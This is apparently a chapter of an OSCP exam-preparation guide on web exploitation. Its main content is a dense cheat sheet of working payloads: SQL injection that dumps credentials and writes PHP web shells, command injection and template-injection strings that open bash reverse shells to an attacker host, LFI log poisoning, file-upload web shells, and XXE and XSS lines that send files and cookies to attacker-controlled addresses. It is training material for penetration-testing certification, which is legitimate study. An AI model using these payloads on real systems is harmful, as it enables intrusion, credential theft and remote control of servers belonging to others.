# 02 · Web attacks (foothold via web)

Turning an enumerated web app into a shell. Work from the parameters and forms you catalogued in
[§01](01-recon-and-enumeration.md): every user-controllable input is a candidate for one of the
classes below.

> 🚩 **EXAM:** SQLMap and other automated exploitation tools are **banned** on the OSCP exam. Learn
> the manual flows here — they're the point. (SQLMap is fine for practice/labs.)

---

## 2.1 SQL injection

**Detect:** submit `'`, `"`, `)`, and observe errors or changed behavior. Fingerprint the DBMS:
`SELECT @@version` (MySQL/MSSQL), `SELECT version()` (PostgreSQL).

**UNION flow** — find the column count first (`ORDER BY n` until it errors, or `UNION SELECT 1,2,3…`),
then walk the schema:

```sql
' UNION SELECT 1,database(),3-- -
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
```

**Blind — boolean:** compare `AND 1=1` vs `AND 1=2`; extract char-by-char with `LIKE 'a%'`.
**Blind — time:** `AND SLEEP(5)` (MySQL) / `AND pg_sleep(5)` (PostgreSQL) / `WAITFOR DELAY '0:0:5'` (MSSQL).

**Auth bypass:** `' OR 1=1-- -`, `admin'-- -`.

**RCE / file R-W via SQLi:**
```sql
-- MySQL: read/write files
' UNION SELECT LOAD_FILE('/etc/passwd')-- -
' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/sh.php'-- -
-- MSSQL: command execution
'; EXEC xp_cmdshell 'whoami'-- -
```

**Filter evasion:** case (`SeLeCt`), inline comments (`SE/**/LECT`, spaces→`/**/` or `%09/%0A`),
no-quotes via `CHAR()`/hex (`0x61646d696e` = `admin`), keyword swaps (`&&`/`||` for `AND`/`OR`).

> 💡 HTTP header injection counts too — a vulnerable `User-Agent`/`X-Forwarded-For` reaches the query:
> `curl -H "User-Agent: ' UNION SELECT username,password FROM users-- -" http://<ip>/`

## 2.2 NoSQL injection (MongoDB)

Operator injection to bypass auth or extract data:
```
username[$ne]=x&password[$ne]=x            # not-equal → returns first user
username[$nin][]=admin                     # not-in
password[$regex]=^a                        # confirm chars one by one
```

## 2.3 Command injection

Chain OS commands through an unsanitized parameter:
```bash
; whoami        | whoami        & whoami        && whoami        || whoami
`whoami`        $(whoami)                                        # command substitution
; bash -c "bash -i >& /dev/tcp/<ip>/<port> 0>&1"                 # reverse shell
```
If output is blind, exfil via `; ping -c1 <ip>` (watch tcpdump) or `; curl http://<ip>/$(whoami)`.

## 2.4 LFI / RFI

```
?page=../../../../etc/passwd
?page=....//....//....//etc/passwd          # bypass naive ../ stripping
?page=../../../etc/passwd%00                # null byte (PHP < 5.3.4)
?page=..%252f..%252f..%252fetc%252fpasswd   # double URL-encode
```

**PHP wrappers:**
```
php://filter/convert.base64-encode/resource=index.php     # read source (find creds/params)
data://text/plain,<?php system($_GET['c']);?>             # RCE if allow_url_include
```

**LFI → RCE via log poisoning:** inject PHP into a log the app will include.
```
# 1) poison: set User-Agent to  <?php system($_GET['c']); ?>
# 2) include:  ?page=/var/log/apache2/access.log&c=id
# SSH variant: log in as  <?php system($_GET['c']); ?>  → include /var/log/auth.log
```
Also: PHP **session files** (`/var/lib/php/sessions/sess_<PHPSESSID>`) and **PHP filter chains**
(turn any file read into RCE when no other wrapper works).

## 2.5 File upload bypass

Goal: land an executable web shell. Attack the filter in place:
```
shell.php.jpg   shell.pHp   shell.phtml/.php5/.phar   # extension blacklist
Content-Type: image/png                               # MIME check (change in Burp)
GIF89a;<?php system($_GET['c']);?>                    # magic-byte prefix
shell.php%00.jpg                                      # null byte (old PHP)
```
- Bypass client-side JS filters by uploading a valid file, then editing the request in Burp.
- Inject PHP into image **EXIF** data if only content is checked, then include/execute it.
- Minimal shell: `<?php system($_GET['c']); ?>` — then browse to it with `?c=id`.

## 2.6 XXE

```xml
<!-- in-band file read -->
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<r>&xxe;</r>
```
**Out-of-band** (blind / no reflected output) — host `evil.dtd`, reference it, exfil via parameter entities:
```xml
<!-- evil.dtd -->
<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY exfil SYSTEM 'http://<ip>:1337/?d=%cmd;'>"> %oob;
<!-- payload -->
<!DOCTYPE u SYSTEM "http://<ip>:1337/evil.dtd"> <u>&exfil;</u>
```

## 2.7 SSTI

**Detect:** `{{7*7}}` → 49 means evaluation. Distinguish engines: `{{7*'7'}}` → `7777777` (Jinja2/Python)
vs `49` (Twig/PHP); `#{7*7}` → 49 (Pug/JS).

```python
# Jinja2 → RCE
{{"".__class__.__mro__[1].__subclasses__()[157].__repr__.__globals__.get("__builtins__").get("__import__")("subprocess").check_output(['bash','-c','bash -i >& /dev/tcp/<ip>/<port> 0>&1'])}}
```
```js
// Pug/Jade → RCE
#{root.process.mainModule.require('child_process').spawnSync('bash',['-c','bash -i >& /dev/tcp/<ip>/<port> 0>&1'])}
```
Smarty (PHP): `{system('id')}`.

## 2.8 XSS

Mostly relevant here for stealing sessions / reaching an admin action.
```html
<script>alert(1)</script>          "><img src=x onerror=alert(1)>          <svg onload=alert(1)>
<script>fetch('http://<ip>:8888/?c='+document.cookie)</script>              <!-- steal cookie -->
```
Filter bypass: `<scr<script>ipt>`, event handlers, `<iMg />` case tricks.

## 2.9 SSRF

Make the server request a target of your choosing — reach internal services, cloud metadata, or pivot.
```
?url=http://127.0.0.1:80/            ?url=http://169.254.169.254/latest/meta-data/   (cloud)
```
Bypass filters with `127.0.0.1` alternatives (`127.1`, `0`, `[::1]`, decimal IP), or `@`/`#` tricks.

## 2.10 Others (quick hits)

- **IDOR:** increment/replace IDs (`/account?id=1002`) to reach other users' objects.
- **Insecure deserialization:** PHP `unserialize()`, Java/Python pickle — craft gadget chains (`ysoserial`).
- **Prototype pollution (JS):** `__proto__[isAdmin]=true` in JSON/params → privilege/logic bypass.
- **CSRF:** forge state-changing requests when no anti-CSRF token — useful to make an admin act for you.

## 2.11 Before you move on

- [ ] Every parameter/form tested for SQLi, command injection, and LFI at minimum.
- [ ] File upload points tested against extension/MIME/magic-byte bypasses.
- [ ] App source read where LFI/`php://filter` allows — creds and hidden params extracted.
- [ ] Any RCE turned into a stable reverse shell (see [§03](03-shells-and-payloads.md)).
- [ ] All discovered creds tried against every other service (SSH, SMB, admin panels).
